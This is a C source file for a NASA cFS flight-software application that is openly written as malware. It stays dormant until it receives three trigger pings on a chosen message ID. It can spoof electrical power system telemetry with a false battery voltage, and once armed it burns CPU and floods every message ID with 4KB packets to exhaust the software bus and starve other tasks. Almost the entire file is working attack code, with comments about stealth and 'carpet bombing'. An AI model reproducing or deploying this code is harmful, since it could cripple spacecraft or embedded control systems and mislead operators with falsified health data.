#include "cfe.h"
#include "cfe_sb.h"
#include "cfe_es.h"
#include "cfe_evs.h"
#include <string.h>
#include "generic_eps_msg.h"
#include "generic_eps_msgids.h" /* GENERIC_EPS_HK_TLM_MID = 0x091A */

#define MALWARE_TRIGGER_MID 0x18F0
#define BEACON_PING_FC      2
#define SPOOF_EPS_FC        3
#define TRIGGER_THRESHOLD   3

/* * MAXIMIZED PAYLOAD:
 * We use a 4KB payload. 512KB Buffer Pool / 4KB = ~128 messages.
 * The memory pool will be completely exhausted in a fraction of a millisecond.
 */
typedef struct
{
    CFE_MSG_CommandHeader_t CmdHeader;
    uint8                   MaliciousPayload[4096];
} NOISY_APP_Pkt_t;

void NOISY_APP_Main(void)
{
    uint32          RunStatus = CFE_ES_RunStatus_APP_RUN;
    NOISY_APP_Pkt_t SpamPacket;
    GENERIC_EPS_Hk_tlm_t SpoofPkt;
    bool            AttackArmed = false;
    uint32          PingsSeen   = 0;

    CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    CFE_ES_WaitForStartupSync(10000);

    CFE_SB_PipeId_t  TriggerPipe;
    CFE_SB_Buffer_t *BufPtr;
    CFE_SB_CreatePipe(&TriggerPipe, 10, "MALWARE_PIPE");
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(MALWARE_TRIGGER_MID), TriggerPipe);

    CFE_EVS_SendEvent(1, CFE_EVS_EventType_INFORMATION,
                      "NOISY_APP: Active. Listening on BEACON MID 0x18F0. "
                      "Detonation after %d PINGs.",
                      (int)TRIGGER_THRESHOLD);

    while (CFE_ES_RunLoop(&RunStatus) == true)
    {
        if (AttackArmed == false)
        {
            int32 status = CFE_SB_ReceiveBuffer(&BufPtr, TriggerPipe, CFE_SB_POLL);
            if (status == CFE_SUCCESS)
            {
                CFE_SB_MsgId_t    RcvMsgId;
                CFE_MSG_FcnCode_t FcnCode = 0;
                CFE_MSG_GetMsgId(&BufPtr->Msg, &RcvMsgId);
                CFE_MSG_GetFcnCode(&BufPtr->Msg, &FcnCode);

                if (CFE_SB_MsgIdToValue(RcvMsgId) == MALWARE_TRIGGER_MID && FcnCode == BEACON_PING_FC)
                {
                    PingsSeen++;
                    CFE_EVS_SendEvent(3, CFE_EVS_EventType_INFORMATION, "NOISY_APP: PING #%u intercepted. %u of %u.",
                                      (unsigned int)PingsSeen, (unsigned int)PingsSeen,
                                      (unsigned int)TRIGGER_THRESHOLD);

                    if (PingsSeen >= TRIGGER_THRESHOLD)
                    {
                        AttackArmed = true;
                        CFE_EVS_SendEvent(2, CFE_EVS_EventType_CRITICAL,
                                          "NOISY_APP: THRESHOLD REACHED. OMNIDIRECTIONAL STORM INITIATED.");
                    }
                }
                else if (CFE_SB_MsgIdToValue(RcvMsgId) == MALWARE_TRIGGER_MID && FcnCode == SPOOF_EPS_FC)
                {
                    memset(&SpoofPkt, 0, sizeof(SpoofPkt));
                    CFE_MSG_Init(CFE_MSG_PTR(SpoofPkt.TlmHeader), CFE_SB_ValueToMsgId(GENERIC_EPS_HK_TLM_MID),
                                 GENERIC_EPS_HK_TLM_LNGTH);
                    SpoofPkt.DeviceHK.BatteryVoltage = 0xDEAD;
                    CFE_SB_TimeStampMsg(CFE_MSG_PTR(SpoofPkt.TlmHeader));
                    CFE_SB_TransmitMsg(CFE_MSG_PTR(SpoofPkt.TlmHeader), false);
                    CFE_EVS_SendEvent(4, CFE_EVS_EventType_CRITICAL,
                                      "NOISY_APP: EPS HK SPOOF transmitted (BatteryVoltage=0xDEAD).");
                }
            }
            OS_TaskDelay(100); /* Yield while dormant to remain stealthy */
        }
        else
        {
            /*
             * ============================================================
             * PHASE 2: OMNIDIRECTIONAL BROADCAST STORM
             * ============================================================
             */

            /* CPU BURN: Maximize core temperature / power consumption */
            volatile uint64 burn = 0;
            for (volatile uint32 i = 0; i < 5000000; i++)
            {
                burn += i * i;
            }

            /* * CARPET BOMBING:
             * Loop through every possible MID in the cFS architecture (0x0000 to 0x1FFF).
             * Send exactly 4 packets to each. This bypasses the Subscription Limit
             * but guarantees EVERY pipe in the system overflows instantly.
             */
            for (uint16 current_mid = 0x0000; current_mid <= 0x1FFF; current_mid++)
            {
                CFE_MSG_Init((CFE_MSG_Message_t *)&SpamPacket, CFE_SB_ValueToMsgId(current_mid), sizeof(SpamPacket));

                for (int i = 0; i < 4; i++)
                {
                    CFE_SB_TransmitMsg((CFE_MSG_Message_t *)&SpamPacket, true);
                }
            }

            /* * NO YIELD: We intentionally do NOT call OS_TaskDelay().
             * Running at Priority 20, this thread permanently hijacks the CPU.
             */
        }
    }

    CFE_ES_ExitApp(RunStatus);
}
